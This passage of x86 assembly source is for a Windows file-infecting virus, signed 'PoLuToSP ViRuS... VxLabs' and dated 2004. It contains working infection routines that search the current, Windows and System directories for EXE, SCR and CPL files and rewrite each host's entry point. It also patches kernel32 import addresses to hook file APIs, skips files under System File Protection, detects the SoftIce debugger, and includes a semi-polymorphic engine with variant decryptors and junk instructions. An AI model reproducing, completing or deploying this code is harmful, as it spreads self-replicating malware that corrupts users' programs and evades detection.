	call	[@_SetCurrentDirectoryA+ebp]	; Move to Windows Directory
	xor	ecx,ecx
	inc	ecx
	call	SetBufferTres			; Set Buffer for SFC calls
	call	BuscarArchivos			; hahaha... more Files!!!
	push	MAX_PATH
	lea	eax,[BufferDos+ebp]		; Get the System Path
	push	eax
	call	[@_GetSystemDirectoryA+ebp]
	mov	[H_NumLetrasB+ebp],eax		; Save Path Lenght
	lea	eax,[BufferDos+ebp]
	push	eax
	call	[@_SetCurrentDirectoryA+ebp]	; Move to System Directory
	xor	ecx,ecx
	inc	ecx
	call	SetBufferTres			; Set Buffer for SFC calls
	call	BuscarArchivos			; Ufff... do you want more File?
	lea	eax,[BufferUno+ebp]		; Return to initial Host Path 
	push	eax
	call	[@_SetCurrentDirectoryA+ebp]
	ret
RuntimeVirus endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Set all Resident Hooks					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

SetAllHooks proc
	lea	edi,[V_Direcciones@4+ebp]	; Get the APIs we wanna Hook
	lea	esi,[V_Offsets@1+ebp]		; And the offsets of Hooking Process
SetAll@1:
	call	SetHook				; And Make a little changes in Import Header!!!
	or	eax,eax
	jz	SetAllError@1			; Hummm, API not found
	call	DesprotegerMemoria		; If Memory is protected... try to Unprotect
	or	eax,eax				;  it first... whahaha
	jz	SetAllError@1
	lodsd
	add	eax,ebp
	mov	[ebx],eax			; Make API reference point to our process
	add	eax,offset V_DeltaHook - offset HookCopyFileA
	mov	[eax],ebp
	add	eax,offset V_JumpHook - offset V_DeltaHook
	mov	ebx,[edi]
	mov	[eax],ebx
	call	ProtegerMemoria			; And Protect again the Memory Block
SetAll@2:
	add	edi,04h				; Well, the next one API
	mov	eax,[edi]
	or	eax,eax				; Is it the last one? No? go on
	jnz	SetAll@1
	ret
SetAllError@1:
	add	esi,04h				; Great, the next offset
	jmp	SetAll@2
SetAllHooks endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to put a Path in Buffer				 	*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

SetBufferTres proc
	push	esi				; Save some registers
	push	edi
	or	ecx,ecx				; Actual Path or Other?
	jz	SetBuffer@1
	lea	esi,[BufferDos+ebp]		; If Windows or System Path
	mov	ecx,[H_NumLetrasB+ebp]		; Set some values
	jmp	SetBuffer@2
SetBuffer@1:
	lea	esi,[BufferUno+ebp]		; If actual Path
	mov	ecx,[H_NumLetrasA+ebp]		; Set some values
SetBuffer@2:
	lea	edi,[BufferTres+ebp]
	xor	eax,eax
SetBuffer@3:
	lodsb					; Make BufferTres with the actual Path, but
	stosw					;  in Unicode instead Ansi string
	loop	SetBuffer@3
	xor	eax,eax
	stosw					; This is for a SfcIsFileProtected API
	pop	edi				;  that needs absolute Paths in Unicode
	pop	esi
	ret
SetBufferTres endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to write the Entry Point					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

SetEntryPoint proc
	push	esi			; Make the Enty Point Value point to the last
	push	ebx			;  Code Section 6 bytes
	lea	esi,[V_EntryPoint+ebp]
	mov	eax,[H_RvaText+ebp]
	mov	[edx+28h],eax		; This is the new Entry Point... hahaha
	add	eax,05h
	sub	ebx,eax			; Path the relative call
	mov	[esi+01h],ebx
	mov	edi,[H_RawText+ebp]	; And Put there the relative call to the Virus
	lodsb				;  and some stuff
	stosb
	lodsd
	stosd
	lodsb
	stosb
	mov	esi,[H_TextHeader+ebp]	; Actualice the Code Section Virtual Size	
        add     dword ptr[esi+08h],06h
	pop	ebx
	pop	esi
	ret				; Bye!
SetEntryPoint endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to set the Re-Entry of Virus				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

SetReEntrada proc
	lea	esi,[V_ReEntrada+ebp]		; Because the virus have first the
	lea	edi,[V_Desencriptar+ebp]	;  decritor routine... if the program
	lodsb					;  is called 2 or 3 times (like CPL ones)
	stosb					;  we have to change the first bytes
	lodsd					;  with a simple call to a FindFiles
	stosd					;  routine in the current Path and Finish
	lodsw
	stosw					; Move Instructions from a Internal Part
	lodsw					;  to the Virus Begin
	stosw
	lodsw
	stosw
	lodsd
	stosd
	lodsw
	stosw
	ret					; And Finish!
SetReEntrada endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Set one Resident Hook					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

SetHook proc
	push	esi				; Go to the Import Section Header
	push	edi
	mov	esi,[H_ImageBase+ebp]
	add	esi,[esi+3Ch]
	add	esi,80h
	lodsd
	add	eax,[H_ImageBase+ebp]		; We have the poiner to Section Header
	mov	esi,eax
SetHook@1:
	push	esi
	mov	esi,[esi+0Ch]			; Well, look for a Kernel32 decriptor...
	or	esi,esi
	jz	SetHookError@1
	add	esi,[H_ImageBase+ebp]
	lea	edi,[N_Kernel+ebp]
	mov	ecx,08h
	cld
	rep	cmpsb				; Compare it, if equal -> go on
	pop	esi
	jz	SetHook@2
	add	esi,14h
	jmp	SetHook@1
SetHook@2:
	mov	edx,[esi+10h]			; Great!... Find the API we wanna Hook
	add	edx,[H_ImageBase+ebp]
	xor	ebx,ebx
	pop	edi
	mov	eax,[edi]			; Look on First Thunk... whahaha!
SetHook@4:
	mov	ecx,[edx]
	or	ecx,ecx
	jz	SetHookError@2
	cmp	ecx,eax				; Check it now!... by address
	jz	SetHook@3
	add	edx,04h				; Try the next one
	inc	ebx
	jmp	SetHook@4			; And go back
SetHook@3:
	shl	ebx,02h				; We have the Address of the API reference
	add	ebx,[esi+10h]			;  in the Import Header... whahaha
	add	ebx,[H_ImageBase+ebp]
	pop	esi
	xor	eax,eax				; Great! Done! eax non zero value
	inc	eax
	ret
SetHookError@1:
	pop	esi
	pop	edi
SetHookError@2:
	pop	esi
	xor	eax,eax				; Ups! Shit! eax zero
	ret
SetHook endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Check if a File is SFC protected				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

SfcIsFileProtected proc
	push	esi				; Save some Registers
	push	edi
	mov	ecx,[@_SfcIsFileProtected+ebp]	; Have the System SFC protection?
	or	ecx,ecx
	jz	NoHaySfc@1			; If not... skip this part!
	lea	edi,[BufferTres+ebp]
	push	edi
	xor	eax,eax				; Take the actual Path in Unicode 
SfcBucle@1:					;  and add to it the File Name
	scasw
	jnz	SfcBucle@1
	mov	al,'\'				; And now the Actual File Name
	mov	[edi-02h],ax
	mov	ebx,edi
SfcBucle@2:
	lodsb
	stosw
	or	eax,eax
	jnz	SfcBucle@2
	push	eax
	call	ecx				; Is File with SFC protected?
	dec	ebx
	dec	ebx
	xor	ecx,ecx
	mov	[ebx],cx			; Make the actual Path as the begin
NoHaySfc@1:
	pop	edi
	pop	esi
	ret					; eax zero if not protected with SFC
SfcIsFileProtected endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Truncate the Host Size					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

TruncarHostNuevo proc
	xor	eax,eax				; Truncate the Open File
	push	eax
	push	eax
	push	ebx
	push	dword ptr[H_HandleOpen+ebp]	; Set the File Pointer where we want
	call	[@_SetFilePointer+ebp]
	push	dword ptr[H_HandleOpen+ebp]	; Set there the End of File
	call	[@_SetEndOfFile+ebp]
	ret
TruncarHostNuevo endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Function to Unmap one File from Memory				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

UnmapFile proc
	push	ebx
	call	[@_UnmapViewOfFile+ebp]		; Simple Unmap the File from Memory
	ret
UnmapFile endp

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* All Posible Decriptors of Virus					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

V_Decriptores:
V_Dec@0:
	mov	ecx,5A5A5A5Ah			; All the Decriptors basic structure...
	mov	edx,TamVirus@1			; But many instructions are changed
	lea	esi,[V_Virus+ebp]		;  while we're building a new decriptor
V_Buc@0:
	ror	byte ptr[esi],cl		; Operate with one byte
	add	byte ptr[esi],cl
	inc	esi				; Increment the pointer
	ror	ecx,08h				; Rotate the 32 bits Key
	dec	edx				; Decrement the counter and go on
	jnz	V_Buc@0

V_Dec@1:
	mov	ecx,5A5A5A5Ah
	mov	edx,TamVirus@1
	lea	esi,[V_Virus+ebp]
V_Buc@1:
	xor	byte ptr[esi],cl
	add	byte ptr[esi],cl
	inc	esi
	ror	ecx,08h
	dec	edx
	jnz	V_Buc@1

V_Dec@2:
	mov	ecx,5A5A5A5Ah
	mov	edx,TamVirus@1
	lea	esi,[V_Virus+ebp]
V_Buc@2:
	add	byte ptr[esi],cl
	rol	byte ptr[esi],cl
	inc	esi
	ror	ecx,08h
	dec	edx
	jnz	V_Buc@2

V_Dec@3:
	mov	ecx,5A5A5A5Ah
	mov	edx,TamVirus@1
	lea	esi,[V_Virus+ebp]
V_Buc@3:
	rol	byte ptr[esi],cl
	xor	byte ptr[esi],cl
	inc	esi
	ror	ecx,08h
	dec	edx
	jnz	V_Buc@3

V_Dec@4:
	mov	ecx,5A5A5A5Ah
	mov	edx,TamVirus@1
	lea	esi,[V_Virus+ebp]
V_Buc@4:
	xor	byte ptr[esi],cl
	sub	byte ptr[esi],cl
	inc	esi
	ror	ecx,08h
	dec	edx
	jnz	V_Buc@4

V_Dec@5:
	mov	ecx,5A5A5A5Ah
	mov	edx,TamVirus@1
	lea	esi,[V_Virus+ebp]
V_Buc@5:
	sub	byte ptr[esi],cl
	ror	byte ptr[esi],cl
	inc	esi
	ror	ecx,08h
	dec	edx
	jnz	V_Buc@5

V_Dec@6:
	mov	ecx,5A5A5A5Ah
	mov	edx,TamVirus@1
	lea	esi,[V_Virus+ebp]
V_Buc@6:
	ror	byte ptr[esi],cl
	xor	byte ptr[esi],cl
	inc	esi
	ror	ecx,08h
	dec	edx
	jnz	V_Buc@6

V_Dec@7:
	mov	ecx,5A5A5A5Ah
	mov	edx,TamVirus@1
	lea	esi,[V_Virus+ebp]
V_Buc@7:
	add	byte ptr[esi],cl
	ror	byte ptr[esi],cl
	inc	esi
	ror	ecx,08h
	dec	edx
	jnz	V_Buc@7

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* All Posible Encriptor instructions of Virus				*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

V_Encriptores:
V_Enc@0:
	sub	byte ptr[edi],cl	; All the possible Encriptors that are used 
	rol	byte ptr[edi],cl	;  when we Encript the Virus Body in a New Host

V_Enc@1:
	sub	byte ptr[edi],cl	; Operate with one byte
	xor	byte ptr[edi],cl

V_Enc@2:
	ror	byte ptr[edi],cl
	sub	byte ptr[edi],cl

V_Enc@3:
	xor	byte ptr[edi],cl
	ror	byte ptr[edi],cl

V_Enc@4:
	add	byte ptr[edi],cl
	xor	byte ptr[edi],cl

V_Enc@5:
	rol	byte ptr[edi],cl
	add	byte ptr[edi],cl

V_Enc@6:
	xor	byte ptr[edi],cl
	rol	byte ptr[edi],cl

V_Enc@7:
	rol	byte ptr[edi],cl
	sub	byte ptr[edi],cl

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Shit Instructions used by the Semi-Morfic engine			*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

V_UnByte:
	aaa			; Shit Instructions (1 Byte)
	aas			; The other registers are used in decriptor routine
	clc
	cmc
	daa
	das
	dec	eax
	dec	ebx
	inc	eax
	inc	ebx
	lahf
	nop
	sahf
	stc
	xchg	eax,ebx
	xchg	ebx,eax

V_DosBytes:
	add	eax,ebx		; Shit Instructions (2 Bytes)
	add	ebx,eax
	adc	eax,ebx
	adc	ebx,eax
	and	eax,ebx
	and	ebx,eax
	bswap	eax
	bswap	ebx
	cbw
	mov	eax,ebx
	mov	ebx,eax
	neg	eax
	neg	ebx
	not	eax
	not	ebx
	or	eax,ebx
	or	ebx,eax
	push	eax
	pop	ebx
	push	ebx
	pop	eax
	pushf
	popf
	rol	eax,cl
	rol	ebx,cl
	ror	eax,cl
	ror	ebx,cl
	shl	eax,cl
	shl	ebx,cl
	shr	eax,cl
	shr	ebx,cl
	xor	eax,eax
	xor	ebx,ebx
	xor	eax,ebx
	xor	ebx,eax

V_TresBytes:
	add	ax,bx		; Shit Instructions (3 Bytes)
	add	bx,ax
	adc	ax,bx
	adc	bx,ax
	and	ax,bx
	and	bx,ax
	bswap	ax
	bswap	bx
	lea	eax,[eax+ebp]
	lea	eax,[ebx+ebp]
	lea	ebx,[eax+ebp]
	lea	ebx,[ebx+ebp]
	mov	ax,bx
	mov	bx,ax
	neg	ax
	neg	bx
	not	ax
	not	bx
	or	ax,bx
	or	bx,ax
	rol	ax,cl
	rol	bx,cl
	ror	ax,cl
	ror	bx,cl
	shl	ax,cl
	shl	bx,cl
	shr	ax,cl
	shr	bx,cl
	xor	ax,ax
	xor	bx,bx
	xor	ax,bx
	xor	bx,ax

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Re-Entry used Instructions						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

V_ReEntrada:
	mov	eax,offset BuscarArchivos	; Instructions that are copied to the begin
	add	eax,ebp				;  of Virus, to make possible the Re-Entry
	call	eax				;  in the CPL Files
	lea	eax,[V_VueltaHost+ebp]		; Make a Search in actual Path and come back
	jmp	eax				;  to the Infected Host

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Entry Point First Instructions					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

V_EntryPoint:
	call	AlinearCifra			; Instructions that are copied to last
	ret					;  6 bytes of Code Section (Hard-Coded)

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Structures used by the Virus						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

BufferDos	db	MAX_PATH dup (?)	; Windows and System Path
BufferTres	dw	MAX_PATH dup (?)	; Actual Path in Unicode
BufferUno	db	MAX_PATH dup (?)	; Initial Path of the Host
DatosArchivo	WIN32_FIND_DATA			?	; Structure to Find Files
V_Info@1:
InfoMemoria	MEMORY_BASIC_INFORMATION	?	; Structure to Info a Memory Block
V_Info@2:
SysDate		SYSTEMTIME			?	; Structure for System Time

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Global Variables used by the Virus					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

H_Alineamiento		dd	?	; Section Alignment of the Host
H_AtributosFile		dd	?	; Real Attributes of New Host
H_Delta			dd	?	; Partial calculated Delta, used in infection
H_HandleArchivo		dd	?	; File Handle
H_HandleMapa		dd	?	; Map Handle
H_HandleOpen		dd	?	; Open Handle
H_HandlePantalla	dd	?	; Screen Handle, used in Payload
H_ImageBase		dd	?	; The actual Host Image Base
H_NumLetrasA		dd	?	; Length of actual Path
H_NumLetrasB		dd	?	; Length of Windows or System Path
H_Proteccion		dd	?	; Memory Protection
H_RawText		dd	?	; Raw of Code Section in New Host
H_RvaHost		dd	?	; Entry Point of actual Host
H_RvaText		dd	?	; Rva of Code Section in New Host
H_RvaVirus		dd	?	; Rva of Virus Entry
H_Semilla		dd	?	; Seed used by the Random Number Generator
H_TamHostVirus		dd	?	; Size of Total Infected File
H_TextHeader		dd	?	; Rva to Code Section Header

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Addresses that we use (APIs, etc...)					*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

@_KernelAddress		dd	?	; Address used to find Kernel Base and 
@_AddressTable		dd	?	;  the GetProcAddress API
@_NameTable		dd	?
@_OrdinalTable		dd	?
@_DirArchivo		dd	?
@_GetProcAddress	dd	?

V_Direcciones@1:
@_GetFileAttributesA	dd	?	; All the APIs addresses needed
@_SetFileAttributesA	dd	?
@_SetFileTime		dd	?
@_VirtualProtect	dd	?
@_VirtualQuery		dd	?
@_SetFilePointer	dd	?
@_SetEndOfFile		dd	?
@_Beep			dd	?
@_LoadLibraryA		dd	?
@_GetSystemTime		dd	?
@_GetTickCount		dd	?
@_CreateFileMappingA	dd	?
@_MapViewOfFile		dd	?
@_UnmapViewOfFile	dd	?
@_FindClose		dd	?
@_SetCurrentDirectoryA	dd	?
@_GetCurrentDirectoryA	dd	?
@_GetWindowsDirectoryA	dd	?
@_GetSystemDirectoryA	dd	?
@_CloseHandle		dd	?
@_ExitProcess		dd	?
V_Direcciones@4:
@_MoveFileA		dd	?
@_CopyFileA		dd	?
@_DeleteFileA		dd	?
@_CreateFileA		dd	?
@_GetModuleHandleA	dd	?
@_FindFirstFileA	dd	?
@_FindNextFileA		dd	?
@_FinalDirecciones	dd	00h
V_Direcciones@2:
@_GetDC			dd	?
V_Direcciones@3:
@_CreateSolidBrush	dd	?
@_SelectObject		dd	?
@_Ellipse		dd	?
V_Direcciones@5:
@_SfcIsFileProtected	dd	?

V_Offsets@1:
V_Hook@1	dd	offset HookMoveFileA		; offsets to process used to hook
V_Hook@2	dd	offset HookCopyFileA		;  calls in Per-Process Resident
V_Hook@3	dd	offset HookDeleteFileA
V_Hook@4	dd	offset HookCreateFileA
V_Hook@5	dd	offset HookGetModuleHandleA
V_Hook@6	dd	offset HookFindFirstFileA
V_Hook@7	dd	offset HookFindNextFileA

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* Strings used by the Virus						*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***

N_GdiLib		db	'GDI32.dll',0		; Some Strings for Libraries names
N_IsDebuggerPresent	db	'IsDebuggerPresent',0
N_Kernel		db	'KERNEL32',0
V_Mascara@1:
N_MascaraA		db	'*.EXE',0		; Targets Strings
N_MascaraB		db	'*.SCR',0
N_MascaraC		db	'*.CPL',0,0BBh
N_Nice			db	'\\.\NTICE',0		; To Avoid SoftIce in win9x and winNT
N_Sice			db	'\\.\SICE',0
N_SfcLib		db	'SFC.dll',0
N_UserLib		db	'USER32.dll',0

V_Nombres@1:
N_GetFileAttributesA	db	'GetFileAttributesA',0	; Strings of all APIs needed
N_SetFileAttributesA	db	'SetFileAttributesA',0
N_SetFileTime		db	'SetFileTime',0
N_VirtualProtect	db	'VirtualProtect',0
N_VirtualQuery		db	'VirtualQuery',0
N_SetFilePointer	db	'SetFilePointer',0
N_SetEndOfFile		db	'SetEndOfFile',0
N_Beep			db	'Beep',0
N_LoadLibraryA		db	'LoadLibraryA',0
N_GetSystemTime		db	'GetSystemTime',0
N_GetTickCount		db	'GetTickCount',0
N_CreateFileMappingA	db	'CreateFileMappingA',0
N_MapViewOfFile		db	'MapViewOfFile',0
N_UnmapViewOfFile	db	'UnmapViewOfFile',0
N_FindClose		db	'FindClose',0
N_SetCurrentDirectoryA	db	'SetCurrentDirectoryA',0
N_GetCurrentDirectoryA	db	'GetCurrentDirectoryA',0
N_GetWindowsDirectoryA	db	'GetWindowsDirectoryA',0
N_GetSystemDirectoryA	db	'GetSystemDirectoryA',0
N_CloseHandle		db	'CloseHandle',0
N_ExitProcess		db	'ExitProcess',0
V_Nombres@4:
N_MoveFileA		db	'MoveFileA',0
N_CopyFileA		db	'CopyFileA',0
N_DeleteFileA		db	'DeleteFileA',0
N_CreateFileA		db	'CreateFileA',0
N_GetModuleHandleA	db	'GetModuleHandleA',0
N_FindFirstFileA	db	'FindFirstFileA',0
N_FindNextFileA		db	'FindNextFileA',0,0BBh
V_Nombres@2:
N_GetDC			db	'GetDC',0,0BBh
V_Nombres@3:
N_CreateSolidBrush	db	'CreateSolidBrush',0
N_SelectObject		db	'SelectObject',0
N_Ellipse		db	'Ellipse',0,0BBh
V_Nombres@5:
N_SfcIsFileProtected	db	'SfcIsFileProtected',0,0BBh

N_PiKaS			db	'PoLuToSP ViRuS... VxLabs (Made in Spain)',0	; A stupid mark

V_FinalVirus:

	end	V_Entrada

;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
;* (Learning To Live-Dream Theater)			PiKaS LaBs 2004	*
;**_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_*_-_***
